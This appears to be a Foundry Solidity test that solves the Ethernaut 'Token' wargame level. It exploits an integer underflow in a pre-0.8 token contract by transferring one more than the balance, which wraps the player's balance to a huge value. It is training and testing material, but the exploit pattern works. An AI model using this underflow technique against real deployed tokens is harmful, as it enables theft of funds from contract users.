// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #5 "Token" → SC09 integer underflow (no exact EVM catalog entry yet — a gap; the
/// catalog's overflow case is the Move `cetus-amm-overflow`). `transfer` does `balances[msg.sender]
/// - _value >= 0` on unsigned ints in ^0.6 — always true, and the decrement wraps. Win: the player's
/// balance exceeds the starting supply. (Token is ^0.6 → `deployCode`.)
interface IToken {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract TokenTest is Test {
    function test_solve_token() public {
        address lvl = deployCode("Token.sol:Token", abi.encode(uint256(20))); // 20 minted to this (player)
        uint256 start = IToken(lvl).balanceOf(address(this));

        IToken(lvl).transfer(address(0xdead), start + 1); // underflow -> wraps to ~2^256

        assertGt(IToken(lvl).balanceOf(address(this)), start, "balance underflowed to a huge value");
    }
}
